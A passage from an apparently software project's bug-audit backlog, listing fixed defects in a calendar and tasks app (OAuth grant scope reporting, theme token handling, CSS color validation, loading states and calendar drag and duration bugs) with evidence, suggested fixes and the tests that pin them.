**Suggested fix.** Do not use the master DTSTART as a lower gate for resources that can project backwards. Simplest correct fix: admit `has_rrule=1` rows on the *lower* bound only (drop `dtstart <= ?` for them), i.e. `AND (has_rrule=1 OR duration IS NOT NULL OR (dtstart <= ? AND COALESCE(dtend, dtstart) >= ?))`, and let recur.expand_occurrences do the precise filtering it already does. If the extra rows matter, cache a `min_occurrence` column alongside dtstart (the earliest of the master DTSTART, any RDATE and any override DTSTART) and gate on that. Add a store test with a master + earlier override asserting the row is returned for a window containing only the override.

**Pinned by** `test_an_occurrence_moved_before_its_series_start_is_still_in_the_window` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] list_oauth_grants reads `scope` as a bare column in a multi-aggregate GROUP BY, so the connections screen can report a revoked capability level for a live grant

`backend/tasksd/db/store.py:983` · **low** · bug · `minor` · stage 3

The query groups `oauth_tokens` by `family_id` and selects `t.scope` as a bare (non-aggregated) column alongside three aggregates (MIN(created_at), MAX(created_at), MAX(expires_at)). SQLite's bare-column rule only pins the value to a particular row when the query contains exactly one min()/max() aggregate; with three, the value comes from an arbitrary row of the group. Scope is not constant within a family: `_grant_refresh` (mcp/oauth.py:486-493) deliberately implements RFC 6749 §6 scope narrowing and reissues into the SAME `family_id` with the narrowed scope, while the previous wide-scoped access token stays live for the rest of its hour and the previous wide refresh row is deliberately kept until it expires ("A used refresh token is kept until it expires", store.py:857). So `GET /api/mcp/connections` — the owner's only view of what each connector may do, and the screen they act on to disconnect one — can display a scope that no longer matches what the grant's live tokens can actually do, in either direction, and which row wins depends on scan order rather than on anything meaningful.

<details><summary>Evidence</summary>

```
store.py:982-988:
    "SELECT t.family_id, t.client_id, t.scope, t.resource, "
    "       MIN(t.created_at) AS granted_at, MAX(t.created_at) AS refreshed_at, "
    "       MAX(t.expires_at) AS expires_at, c.client_name "
    "FROM oauth_tokens t LEFT JOIN oauth_clients c ON c.client_id = t.client_id "
    "WHERE t.expires_at > ? GROUP BY t.family_id ORDER BY granted_at DESC"

Reproduced against the real schema (one family f1, client c1):
  create_oauth_token a-wide  access  scope='mcp:read mcp:write offline_access' exp=now+3600
  create_oauth_token r-wide  refresh scope='mcp:read mcp:write offline_access' exp=now+30d
  use_refresh_token(r-wide)                       # the narrowing refresh
  create_oauth_token a-narrow access  scope='mcp:read offline_access' exp=now+3610
  create_oauth_token r-narrow refresh scope='mcp:read offline_access' exp=now+30d

  store.list_oauth_grants(conn, now=now+20)
    -> scope 'mcp:read offline_access'            # "Read only"
  live rows in family f1:
    a-wide  'mcp:read mcp:write offline_access'   # still valid for ~an hour, still writes
    r-wide  'mcp:read mcp:write offline_access'
    a-narrow / r-narrow  'mcp:read offline_access'
  (EXPLAIN QUERY PLAN: SCAN t USING INDEX idx_oauth_tokens_family — the value is whatever row the scan ends on.)

So the owner's connections screen says the connector is read-only while a live access token in that same grant still carries mcp:write.
```

</details>

**Suggested fix.** Stop reading a bare column out of the group. Either report the union of what the family can still do — `GROUP_CONCAT(DISTINCT t.scope)`, or better, aggregate the distinct scope tokens — or pin it to the newest live token with a correlated subquery (`(SELECT scope FROM oauth_tokens x WHERE x.family_id=t.family_id AND x.expires_at>? ORDER BY x.created_at DESC LIMIT 1)`). Add a test that a family whose tokens carry two different scopes reports the one that reflects live capability.

**Pinned by** `test_a_grants_scope_does_not_depend_on_row_order` in `backend/tests/test_backlog_aug19_stage3_core.py`.

### Appearance & settings

#### [x] Shape, density and type tokens are stored per light/dark map, so corner radius, text size, gutter, row height, label case, tracking and all three fonts silently revert on every theme flip

`frontend/src/components/AppearancePanel.tsx:69` · **medium** · rendering · stage 4

Nine of the 23 customizable tokens are not mode-specific in the shipped design: `--serif`, `--sans`, `--mono`, `--radius`, `--fs-scale`, `--gutter`, `--row-y`, `--label-case` and `--tracking` live only in `SHARED_DEFAULTS` and are declared only in the `:root` block of tokens.css — the `:root[data-theme="dark"]` block (tokens.css:64-79) restates colors and nothing else. But `CustomTheme` has only `light` and `dark` maps with no shared bucket, `edit()` merges every patch into `active[mode]` alone, and `resolve()`/`applyTokens()` clear all 23 inline properties and re-apply only the current mode's map. So a user who sets Corners to 8px, Text size to 1.3 or Interface font to Georgia while the app is in light mode loses all of it the moment they flip to dark — and vice versa. The editor confirms the loss rather than hiding it (the Shape/Density/Type controls snap back to the shipped numbers and the counter reads "0 overrides in dark"), but there is no way in the panel to author these tokens once for both modes: the only path that ever populates both is `seedFork(preset)`, which copies a preset's dense maps. appearance.ts's own PRESETS comment names this exact failure — "a token it forgets would fall through to Smylte's value and read as a rendering bug in one mode only" — and a test enforces density for presets, while user themes are left in precisely the sparse state that comment warns about. The existing test `counts each mode separately, since a theme carries both` (AppearancePanel.test.tsx:89) asserts the counter behaviour, not the token semantics, so nothing fails.

<details><summary>Evidence</summary>

````
frontend/src/components/AppearancePanel.tsx:67-82 (`edit`) writes one mode only:
```tsx
const edit = (patch: ThemeTokens) => {
  if (active && !isPreset) {
    const next = { ...active, [mode]: { ...active[mode], ...patch } }
    onChange({ active: active.id, themes: themes.map((t) => (t.id === active.id ? next : t)) })
```
frontend/src/appearance.ts:430-446 then reads back one mode only and wipes the rest:
```ts
export function resolve(appearance, mode) { ... return sanitizeTokens(mode === 'dark' ? theme.dark : theme.light) }
export function applyTokens(el, tokens) {
  for (const name of TOKEN_NAMES) el.style.removeProperty(name)
  for (const [name, value] of Object.entries(sanitizeTokens(tokens))) el.style.setProperty(name, value)
}
```
Ran against the real module (vitest, jsdom):
```
app = { active:'t1', themes:[{ id:'t1', light:{ '--radius':'8px', '--fs-scale':'1.3', '--sans':'Georgia, serif' }, dark:{} }] }
resolve(app,'light') -> { '--radius': '8px', '--fs-scale': '1.3', '--sans': 'Georgia, serif' }
resolve(app,'dark')  -> {}
defaultValue('--radius','dark') -> '0px'
applyTokens(el, resolve(app,'light')) -> style="--radius: 8px; --fs-scale: 1.3; --sans: Georgia, serif;"
applyTokens(el, resolve(app,'dark'))  -> style=""
```
Failure scenario: Settings -> Appearance (app in light mode, shipped design active). Drag Corners to 8px — `edit` forks a theme with `light:{'--radius':'8px'}`, `dark:{}`. Set Text size to 1.3 and Interface to Georgia. Now click the panel's "Dark" button (or toggle the theme anywhere in the app): App's effect re-runs with mode='dark', `resolve` returns `{}`, `applyTokens` removes every inline property, and `--radius`/`--fs-scale`/`--sans` fall back to tokens.css `:root` (0px / 1 / Inter). Every button, input and modal squares off, the whole UI shrinks, and the typeface changes — with the theme still selected and named. Flipping back to light restores it. To keep the layout the user has to re-enter all nine tokens a second time in the other mode, and any later edit to one of them has to be made twice.
````

</details>

**Suggested fix.** Give the shared tokens one home. Cheapest correct change: in `edit()`, split the patch — tokens whose shipped value comes from `SHARED_DEFAULTS` (i.e. `!(token in DEFAULTS.light)`) get merged into BOTH `light` and `dark`, colors keep going into `active[mode]` only; do the same in the per-token `onClear` and in `resetMode`. Alternatively add a third `shared: ThemeTokens` map to `CustomTheme` (mirrored in backend/tasksd/app.py's `CustomTheme`) and have `resolve()` return `{...theme.shared, ...theme[mode]}`. Either way add an appearance.test.ts case asserting that a theme created by setting `--radius` in light resolves to the same `--radius` in dark, and an AppearancePanel test that editing Corners emits a patch landing in both maps.

**Fixed** by taking the cheaper of the two options this entry offers — split the
patch, no schema change — with the drawback it attributes to that option removed.
Already-saved themes are repaired on the READ path by `themeTokens`, exported from
appearance.ts and used by `resolve` and by the panel's `current`/`overridden` so
the page and the panel cannot disagree: a shared token present in only one map is
this bug's fingerprint ("only in light" was never something the editor could
express on purpose), so it counts for both. No migration, no schema change, and
the theme is repaired the next time it loads.

That read-side repair is the stated reason this option was chosen over the
`shared` bucket, and a later review found it had no test: every case here seeds a
theme with the token in BOTH maps, or reads back a value the new WRITE path just
produced, so `themeTokens` reduced to the current mode's map alone passed the
whole suite while every theme a real user had already saved went on losing its
corner radius and typeface on the flip to dark. A case now seeds this bug's
actual fingerprint — the token in one map only, both directions — with a control
that a colour saved in light still does not bleed into dark.

The `shared` bucket was rejected for three reasons, the third decisive: it needs a
matching field on `app.py`'s pydantic `CustomTheme` or every settings PUT silently
drops the user's shape tokens; `parseTheme`/`serializeTheme` are version-stamped,
so a third map is an export-format change; and **the presets are dense** — all 23
tokens in both maps, pinned byte-for-byte against tokens.css — so `seedFork` gives
a forked preset `--radius` in both, and `{...shared, ...mode}` would let the
per-mode copy shadow every later shared edit. The fix would silently do nothing
for exactly the users most likely to hit it.

`resetMode` and the per-token clear are symmetric with the write, which is a
contract decision worth stating: "Reset light" now drops shared tokens from BOTH
maps. Leaving them would make the button visibly inert — the override counter
counts shared tokens in both modes, so it would still read above zero straight
after a reset.

Widened from one slider to all three control kinds, the fork-from-default path,
`onClear` and `resetMode`. The half-fix (split in `edit()` only) is caught — but
NOT by the original pin, nor by the two that drive the other control kinds: only
the `onClear` and `resetMode` cases fail against it.

**Pinned by** `2026-08-19 — appearance > keeps a shape token when the theme flips to dark` and the four cases beside it in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] isColor accepts hex literals CSS rejects (5 and 7 digits) and non-color functions like calc(), so a mistyped color is stored, synced and applied while the editor reports it valid

`frontend/src/appearance.ts:324` · **low** · bug · `minor` · stage 4

The audit already closed this exact failure mode for bare words ("The appearance validator accepts any 3-20 letter word as a color... stored and applied as an override that silently blanks the property"), and the fix replaced the shape test with membership in `NAMED_COLORS`. The other two branches of `isColor` were left as shape tests. `/^#[0-9a-f]{3,8}$/i` accepts 5- and 7-digit hex, which are not legal CSS `<hex-color>` values (only 3, 4, 6 and 8 are), and the function branch only checks that every `name(` occurrence is in `COLOR_FNS` plus paren balance — so `calc(1px)`, `var(--serif)` and `rgb(0,0,0) 0 0` all pass as colors. `isValidToken` therefore returns true, `ColorControl` never applies its `bad` class (AppearancePanel.tsx:303), the value is written into the theme, mirrored to localStorage, PUT to the account and set on the CSSOM by `applyTokens`. `var(--bg)` then resolves to garbage, the declaration is invalid at computed-value time and is dropped — the exact "editor says fine, app renders as if the token had no value" state the previous fix existed to eliminate. `sanitizeTokens` re-runs the same check, so nothing downstream catches it either. There is no test for a wrong-length hex; appearance.test.ts only covers `#FBFAF7` and `#fff`.

<details><summary>Evidence</summary>

````
frontend/src/appearance.ts:323-337:
```ts
function isColor(v: string): boolean {
  if (/^#[0-9a-f]{3,8}$/i.test(v)) return true          // 5 and 7 are not CSS hex colors
  if (/^[a-z]+$/i.test(v)) return NAMED_COLORS.has(v.toLowerCase())   // the branch that WAS fixed
  const fns = [...v.matchAll(/([a-z-]+)\s*\(/gi)].map((m) => m[1].toLowerCase())
  if (!fns.length) return false
  if (!fns.every((f) => COLOR_FNS.has(f))) return false  // name check only, never a parse
```
Ran against the real module (vitest):
```
isValidToken('--bg', '#12345')                     -> true
isValidToken('--bg', '#1234567')                   -> true
isValidToken('--accent', 'calc(1px)')              -> true
isValidToken('--accent', 'rgb(1,2,3), 0 0 0 200vmax red') -> true
sanitizeTokens({'--bg':'#12345'})                  -> { '--bg': '#12345' }
```
Failure scenario A (persistent): Settings -> Appearance -> Surfaces -> Background, paste `#0a0a0` (a 6-digit hex with one character dropped — 5 hex digits). The field renders without the `bad` class, `edit({'--bg':'#0a0a0'})` forks a theme, `applyTokens` runs `setProperty('--bg','#0a0a0')`, and `body { background: var(--bg) }` (tokens.css:159) becomes invalid at computed value time, so the page paints on the browser's default canvas. The panel keeps saying the value is valid, the reset arrow lights up as a real override, the counter says "1 override in light", and the value survives a reload via localStorage and the account settings.
Failure scenario B (visible while typing, because `ColorControl` commits on every keystroke that validates and there is no debounce despite the comment at AppearancePanel.tsx:290-293): typing `#0a0a0a` into Background applies `#0a0` (a real color), then `#0a0a` (a 4-digit hex whose alpha byte is 0x0a — a 4%-opaque background), then `#0a0a0` (invalid, background gone), then the intended value — three full-app repaints of garbage per color the user types.
````

</details>

**Suggested fix.** Make the hex branch match the four legal lengths: `/^#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i`. For the function branch, use the parse oracle the module already has instead of a name list — `toSwatchHex` sets `ctx.fillStyle`, which ignores anything the browser cannot parse, so `isColor` can end with a `CSS.supports('color', v)` check (falling back to the existing shape rules when `CSS.supports` is unavailable, so jsdom stays deterministic). Add appearance.test.ts cases asserting `isValidToken('--bg','#12345')`, `isValidToken('--bg','#1234567')` and `isValidToken('--accent','calc(1px)')` are false while `#fff`, `#fff0`, `#ffffff`, `#ffffff80` and `oklch(...)` stay true.

**Fixed**, but NOT with the `CSS.supports` oracle this entry suggests. Measured
under the suite's own environment: `CSS.supports` is `undefined` in the installed
jsdom, as is the canvas `toSwatchHex` relies on. An oracle-based validator would
be code no test ever executes — every pin would exercise the fallback while the
browser ran the other branch. For a value that reaches
`document.documentElement.style`, localStorage and the account, a rule that can
be read and tested beats one that cannot.

So: a deterministic grammar check. The four legal hex lengths; ONE function call
spanning the whole value (which is what rejects `rgb(1,2,3), 0 0 0 200vmax red`
and subsumes the old paren-balance test); `calc` removed from the set a value may
be headed by, since it is a number and is legal only INSIDE a colour function.

**A `var()` may name only a COLOUR token.** That is the distinction this entry's
own evidence turns on — `var(--serif)` resolves to a font stack and blanks the
property exactly as a typo would — and it is decidable here, from `TOKENS[name].kind`,
and by nothing downstream: `CSS.supports` accepts any `var()`, since a var is only
invalid at computed-value time. A fallback (`var(--accent, #fff)`) is substituted
verbatim, so it is required to be a colour too.

**Supersession, recorded rather than quietly applied.** `backlog.stage4.test.tsx`'s
control `still accepts every form a real value takes` listed `var(--x)` as valid.
`--x` is not a token at all, so it is the same defect as `var(--serif)` and it is
now refused; that control was updated to `var(--accent)` — the legitimate form —
with an assertion that `var(--x)` is false and a comment naming this finding.
Changing a green test to match new code is normally the anti-pattern; here the
older control encoded an assumption this finding overturns, and the alternative
was to leave the validator admitting a value that blanks the token.

The control beside the pin now round-trips every shipped value — both `DEFAULTS`
maps, `SHARED_DEFAULTS` and every preset — through `sanitizeTokens` unchanged.
That is what stops a tightened validator blanking the design for everybody, which
is the failure mode this class of fix has.

**Pinned by** `2026-08-19 — appearance > refuses hex lengths CSS does not have, and functions that are not colours` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] The archived-calendars settings section renders "Loading…" forever when its fetch fails — the sibling section right next to it guards this and it does not

`frontend/src/components/ArchivedCalendarsSection.tsx:39` · **low** · bug · `minor` · stage 4

`setLoaded(true)` sits INSIDE the guarded async callback, after the awaited request. `makeGuard` (util.ts:12-25) swallows the rejection and returns `undefined`, so when `api.calendars()` fails the statement is never reached and `loaded` stays false for the life of the mount. The section then renders `<div className="arch-empty">Loading…</div>` permanently, with no error state and no retry. `ArchivedEvents` (line 95-101) has the identical shape for `api.events`. ConnectionsSection — the other section body in the same settings panel — was written with exactly this guard (`.finally(() => setLoaded(true))`, ConnectionsSection.tsx:27-28), which is what makes the omission here a defect rather than a house style. This is the same class the audit already closed for `useAllTasks` ("never clears `loading` when a fetch fails, so the Home dashboard's task modules render permanently blank with no retry"). No test covers the failure path — SettingsMenu.test.tsx only ever mocks `calendars`/`events` as resolved.

<details><summary>Evidence</summary>

````
frontend/src/components/ArchivedCalendarsSection.tsx:38-41:
```tsx
useEffect(() => {
  guard(async () => { setCals(await api.calendars()); setLoaded(true) })
}, [])
```
and :95-101 for the agenda:
```tsx
guard(async () => {
  setEvents(await api.events(cal.id, ymd(from), ymd(to)))
  setLoaded(true)
})
```
Compare frontend/src/components/ConnectionsSection.tsx:26-30, which does guard it:
```tsx
guard(async () => { setRows(await api.mcpConnections()); setLoaded(true) })
  .finally(() => setLoaded(true))
```
Confirmed by running the component with a rejecting mock (vitest + jsdom):
```
m.calendars.mockRejectedValue(new Error('network down'))
render(<ArchivedCalendarsSection archived={['c1']} ... />)
// after the microtask queue drains:
document.body.textContent === 'Loading…'
```
Failure scenario: the user opens Settings -> Calendar while the connection is momentarily down (or the backend returns a 5xx from `GET /api/calendars`). An error toast fires, but the Archived-calendars area sits on "Loading…" indefinitely — it never says "couldn't load" and never retries; the only way out is to navigate to another settings section and back, which remounts the component.
````

</details>

**Suggested fix.** Mirror ConnectionsSection: `guard(async () => setCals(await api.calendars())).finally(() => setLoaded(true))` in `ArchivedCalendarsSection`, and the same in `ArchivedEvents`. Better still, distinguish the states — keep a `failed` flag so the body can read "Couldn't load archived calendars" with a retry button rather than an empty list. Add a SettingsMenu/ArchivedCalendarsSection test with `calendars` rejecting that asserts "Loading…" is gone once the promise settles.

**Fixed** in BOTH sections — `ArchivedCalendarsSection` and the identical
`ArchivedEvents` ten lines below — with the `.finally(() => setLoaded(true))`
`ConnectionsSection` already uses, plus the `failed` flag this entry asks for so a
failure is distinguishable from an empty archive: "No archived calendars." over a
failed fetch is a confident lie about the account. Also added the `Array.isArray`
guard `data.tsx` uses, since a 200 carrying junk is not a list.

Widened to drive the sibling, and that is what earned it: the half-fix (repair the
first section only) leaves the original pin passing and is caught by the
`ArchivedEvents` case alone. A control asserts a successful fetch still lists the
rows.

That last claim was FALSE as first written, and a later review walked through it:
`loaded` starting `true` passed the whole suite. The control ended
`await screen.findByText('Old work')` and only then looked for
"No archived calendars." — and `findByText` WAITS, so it flushed the fetch and
evaluated the negative assertion after the transient lie had been repainted. The
lie is observable only in the tick before the promise settles, so the control now
holds the fetch open and asserts the in-flight state SYNCHRONOUSLY. Both
eager-settle shapes — `useState(true)` and a `setLoaded(true)` above the await —
are caught.

**Pinned by** `aug19 stage 4b — archived calendars > stops saying "Loading…" once the fetch has failed` and `… > stops saying "Loading…" once the EVENT fetch has failed` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

#### [x] The theme rename row is never closed when the active theme changes, so switching themes with it open and pressing Save renames the theme you switched TO with the old theme's name

`frontend/src/components/AppearancePanel.tsx:45` · **low** · bug · `minor` · stage 4

`renaming` and `name` are captured when the Rename button is pressed (line 173: `setName(active?.name ?? ''); setRenaming(true)`) and are only cleared by the Save and Cancel buttons inside the rename row itself. Nothing resets them when `appearance.active` changes underneath. The rename row's render guard is `{renaming && active && !isPreset && ...}` — it checks that SOME theme is active, not that it is still the one the row was opened for. The theme picker sits directly above it, so selecting a different theme leaves the row open, still pre-filled with the previous theme's name, now bound to a different object. `rename(name)` then writes that name onto `active.id`, which is the new theme. There is no undo and no confirmation: the second theme's name is gone, and two themes in the picker now read identically, which is the one thing that distinguishes them (ids are opaque `clientId().slice(0,16)` strings and are never shown). The same retarget happens after Import (`importTheme` sets `active` to the imported theme) and after Duplicate. AppearancePanel.test.tsx has no coverage of the rename flow at all.

<details><summary>Evidence</summary>

````
frontend/src/components/AppearancePanel.tsx:45, 84, 93-101, 173, 185-193:
```tsx
const [renaming, setRenaming] = useState(false)
const [name, setName] = useState('')
...
const selectTheme = (id: string) => onChange({ ...appearance, active: id || null })   // does not clear `renaming`
...
const rename = (to: string) => {
  if (!active || isPreset) return
  ...
  themes: themes.map((t) => (t.id === active.id ? { ...t, name: clean } : t)),   // `active` is now the NEW theme
}
...
{renaming && active && !isPreset && (   // "some theme is active", not "the one I opened this for"
  <input className="input" value={name} ... aria-label="Theme name" />
```
Confirmed by driving the real component (vitest + @testing-library, parent re-renders with the emitted appearance):
```
themes: [{id:'a', name:'Alpha'}, {id:'b', name:'Beta'}], active: 'a'
click "Rename"                       -> rename field value: "Alpha"
select "Beta" in the Theme picker    -> onChange({ active:'b', themes:[Alpha, Beta] })
(re-render with that appearance)     -> rename bar still open? true, value: "Alpha"
click "Save"                         -> themes: [["a","Alpha"], ["b","Alpha"]]
```
Failure scenario: the user has themes "Alpha" and "Beta". They click Rename on Alpha, then change their mind and pick Beta from the dropdown to look at it. The rename row is still sitting there showing "Alpha", so they press Enter (or click Save) to dismiss what looks like a leftover field. Beta is now called "Alpha", the picker shows two "Alpha" entries, and the change is immediately cached to localStorage and PUT to the account.
````

</details>

**Suggested fix.** Close the row whenever the target changes: `useEffect(() => { setRenaming(false) }, [appearance.active])` (or key the rename row on `active.id`). Also have `saveAs` and `importTheme` call `setRenaming(false)` since both retarget `active`. Add an AppearancePanel test that opens Rename, selects a different theme, and asserts the rename field is gone.

**Fixed** with the one-line effect this entry suggests, keyed on
`appearance.active`, which covers all three retargeting paths — the picker,
Duplicate and Import — because all three write it. Closing rather than
re-priming: re-priming would silently change what the row is about while the user
is looking at it, which is a second version of the same defect.

The pin had an escape hatch and it mattered. Its Save click was `if (save) await
user.click(save)`, so a fix that closes the row passed with the rename never
attempted — the assertion that matters was unreachable in exactly the branch the
fix creates. Restated as the outcome (the row is gone, or it is about the theme
the user is now looking at), and the Duplicate path added. Run against a half-fix
that resets `renaming` inside `selectTheme` only, the picker pin passes and the
Duplicate pin is what fails.

**Pinned by** `aug19 stage 4b — the theme rename bar > never renames the theme the user switched to with the old name` and `… > never renames the copy Duplicate just made with the original name` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

### Calendar view

#### [x] The resize grip on an event that runs past the six-week window truncates the span when released on its own cell

`frontend/src/components/CalendarView.tsx:556` · **medium** · bug · stage 4

The grid clamps a long event's resize grip to the last visible day (`evLast > lastKey ? lastKey : evLast`), but `dragBody` knows nothing about the clamp: its no-op guard compares the newly built end against the event's REAL stored end. For any event whose span continues past the rendered grid, dropping the grip on the very cell it is drawn in is therefore not a no-op — it PATCHes a new DTEND at the window edge and silently deletes the rest of the event. For every other event the same gesture (grab the grip, change your mind, release without moving) is correctly discarded by `if (end === oldEnd) return null`, so nothing warns the user that this one case writes. There is no confirmation, no toast, and no undo; on a recurring event it goes through the scope prompt and can truncate the whole series.

<details><summary>Evidence</summary>

```
CalendarView.tsx:555-556
  const evLast = lastDayOf(e)
  const resizable = key === (evLast > lastKey ? lastKey : evLast)   // grip clamped to the window
calendar.ts:222-236 (dragBody, resize)
  if (ev.all_day) { end = shiftYmd(day, 1) }
  ...
  const oldEnd = ev.end && (ev.all_day ? ev.end.slice(0, 10) : toLocalInput(ev.end))
  if (end === oldEnd) return null                 // compares the REAL end, not the clamped one

Probe against the real component (vitest, TZ=America/New_York, cursor = March 2026):
  event: all-day 'Sabbatical', DTSTART 2026-03-01, DTEND 2026-09-01 (exclusive)
  grid: the grip renders in the cell for the 11th (2026-04-11, days[41])
  fireEvent.dragStart(grip); fireEvent.drop(sameCell)
  -> api.patchEvent called with {"start":"2026-03-01","end":"2026-04-12"}
A six-month block is cut to six weeks by a drag that moved zero pixels. No test in CalendarView.test.tsx fires a drag at all — `dragBody` is only exercised as a pure function, so the seam between the clamped grip and the unclamped no-op guard has no coverage.
```

</details>

**Suggested fix.** Pass the clamp into the arithmetic instead of hiding it in the render: give `dragBody` the displayed last day (or a `clipped` flag) and return null when `mode==='resize'` and the drop day equals the clamped grip day, so releasing the grip where it is drawn is a no-op exactly as it is for an unclipped event. Cheaper alternative: don't render `.ev-resize` at all when `evLast > lastKey` (the grip cannot honestly mean "the last day" there), and add a component test that a dragStart+drop on the same cell issues no patchEvent for a window-clipped span.

**Fixed** by passing the grid's clamp into the arithmetic — `dragBody` gained an
optional fifth argument and refuses a resize whose drop cell is the clamped one
AND whose event genuinely runs past it. Both halves of that condition are load-
bearing, and the cheaper alternative this entry offers (do not draw the grip on a
clipped event) was rejected: it takes away the only way to SHORTEN a long span
from the visible window, and the pin already asserts the grip exists.

Widened first with a TIMED clipped span — the all-day case goes through a
different branch of `dragBody` — plus two controls. The positive one earned its
keep immediately: run against a half-fix that refuses every drop on a clipped
event, the pins still pass and `still resizes a window-clipped span dropped on an
earlier cell` is what fails.

**Pinned by** `2026-08-19 — the calendar grid > does not truncate a window-clipped span dropped where its grip is drawn` and `… > does not truncate a window-clipped TIMED span dropped on its own cell` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] endFromDuration returns the string "NaN-NaN-NaNTNaN:NaN" instead of null when the duration overflows Date, so an unrelated edit is rejected by the server

`frontend/src/calendar.ts:70` · **low** · bug · `minor` · stage 4

`endFromDuration` guards `isNaN` on the START but never on the computed end. A DURATION large enough to push `start + ms` outside the ±8.64e15 ms Date range yields an Invalid Date, and `ymd`/`pad` happily format it as "NaN-NaN-NaNTNaN:NaN" — a truthy string. The docstring promises "or null if it cannot be derived", and the modal's whole `endUnknown` protection ("rather than send a fabricated end and destroy whatever the resource actually holds, leave `end` out of the write") depends on that null. Because the NaN string is truthy, `endUnknown` is false, the End picker renders empty (an invalid datetime-local value), and any save — including a pure rename — PATCHes that string. `_parse_datelike` in app.py raises HTTPException(422, "invalid date/datetime: ..."), so the user's rename is silently lost behind a cryptic toast. DURATION comes straight off the wire from another CalDAV client (adversary #2), and neither `durationMs` nor `endFromDuration` has a single direct test — calendar.test.ts does not import them.

<details><summary>Evidence</summary>

```
calendar.ts:64-71
  const out = new Date(d.getTime() + ms)
  return `${ymd(out)}T${pad(out.getHours())}:${pad(out.getMinutes())}`   // no isNaN(out) check

node: endFromDuration('2026-03-02T09:00:00','P100000000D') === "NaN-NaN-NaNTNaN:NaN"
(durationMs('P100000000D') = 8.64e15 ms, exactly past the Date range)

Probe against the real component (vitest): event with end:null, duration:'P100000000D'
  End field value = ""                       (invalid value -> browser renders it blank)
  rename to 'Renamed', Save ->
  api.patchEvent body = {"summary":"Renamed",...,"start":"2026-03-02T09:00",
                         "end":"NaN-NaN-NaNTNaN:NaN","repeat":"none"}
backend/tasksd/app.py `_parse_datelike` -> HTTPException(422, "invalid date/datetime: 'NaN-NaN-NaNTNaN:NaN'"), so the rename never lands.
```

</details>

**Suggested fix.** Add `if (isNaN(out.getTime())) return null` before the format in `endFromDuration` (and consider rejecting a non-finite `ms` in `durationMs`). Add table-driven tests for `durationMs`/`endFromDuration` covering P1W, PT0S, a negative sign, a bare 'P', and an overflowing duration — none of these are covered today.

**Fixed** at both guards, which is one more than the entry asks for: `isNaN` on
the computed end in `endFromDuration`, and `Number.isFinite` on `ms` in
`durationMs` — `\d+` has no upper bound, so a day count of a few hundred digits
overflows to Infinity before any Date exists. The pin was widened to drive that
second input, having originally driven one value through one guard.

The table this entry asks for is now beside it as an ordinary control (`parses
every DURATION shape RFC 5545 allows, and refuses the rest`): P1W, P1D, P1DT2H30M,
PT0S — legal and zero, which is not the same as null — a signed duration, and the
shapes that must stay refused. Closing the "neither helper had a direct test" half
of the finding, and it is what stops a repair tightening the parser into rejecting
real durations.

**Pinned by** `2026-08-19 — the calendar grid > sends no fabricated end for a DURATION that overflows the calendar` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] Ticking "all day" on a timed event that ends at midnight adds a day the grid never showed

`frontend/src/components/CalendarView.tsx:777` · **low** · bug · `minor` · stage 4

`endIsExclusive`/`lastDayOf` treat a timed DTEND sitting exactly on local midnight as exclusive everywhere the event is *displayed* (bucketByDay, the chips, DayPopover) and everywhere it is *dragged* (dragBody's resize branch was fixed for exactly this in a prior sweep). The modal is the one place that never consults it: when the all-day box is ticked, `endVal` just slices the first ten characters off the timed end, so the exclusive midnight instant is reinterpreted as an inclusive last day, and `endOut = shiftYmd(clampedEnd, 1)` then adds another day on top. A 20:00–24:00 block (trivially authored in Thunderbird/Apple Calendar, per the earlier finding on the same shape) becomes a two-day all-day event, and the picker labelled "End (last day)" contradicts the grid the moment the box is ticked.

<details><summary>Evidence</summary>

```
CalendarView.tsx:776-777, 807-809
  const endVal = allDay ? end.slice(0, 10) : (end.includes('T') ? end : `${end}T10:00`)
  const clampedEnd = endVal < startVal ? startVal : endVal
  const endOut = allDay ? shiftYmd(clampedEnd, 1) : clampedEnd

Probe against the real component (vitest): event DTSTART 2026-03-02T20:00, DTEND 2026-03-03T00:00
  grid: renders on 2026-03-02 only (calendar.test.ts pins this: 'does not spill an event
        that ends exactly at midnight into the next day')
  tick 'all day' -> Start 2026-03-02, End (last day) 2026-03-03   <- already wrong on screen
  Save -> api.patchEvent body {"start":"2026-03-02","end":"2026-03-04"}
The event now covers Mar 2 AND Mar 3 in this app and in every other CalDAV client, after an edit the user believed only changed the representation.
```

</details>

**Suggested fix.** Derive the all-day picker value from the same rule the rest of the module uses: `const endVal = allDay ? lastDayOf({ ...e, start, end }) : ...`, or at minimum `allDay ? (endIsExclusive({end, end_is_date:false}) ? shiftYmd(end.slice(0,10), -1) : end.slice(0,10)) : ...`, clamped to be >= startVal. Add a test that ticking 'all day' on a midnight-ending event writes an exclusive DTEND one day after the start.

**Fixed** in `endVal` only, and the `end.includes('T')` guard is the whole fix:
for an event that is ALREADY all-day, `end` was seeded as the inclusive day with
no `T`, so subtracting again would shorten every real all-day event by a day on
every save. That is exactly the half-fix that was run — subtract whenever
`allDay` is ticked — and it satisfies BOTH pins here while breaking two
long-standing green tests in `CalendarView.test.tsx` (`shows the inclusive last
day…` and `keeps an all-day span the same length…`). The pins could not catch it;
the pre-existing controls did.

Widened with a multi-day midnight-ending span (so the subtraction has to land on
the right day rather than merely happen), a non-midnight control, and an
untick-round-trip control.

**Pinned by** `2026-08-19 — the calendar grid > keeps a midnight-ending event on its one day when it is made all-day` and `… > keeps a multi-day midnight-ending span on the days it covered` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] The duplicate-React-key fix landed on one of the five sites named; task chips, mobile dots, the mobile agenda and DayPopover still key on the bare id/uid

`frontend/src/components/CalendarView.tsx:614` · **low** · rendering · `minor` · stage 4

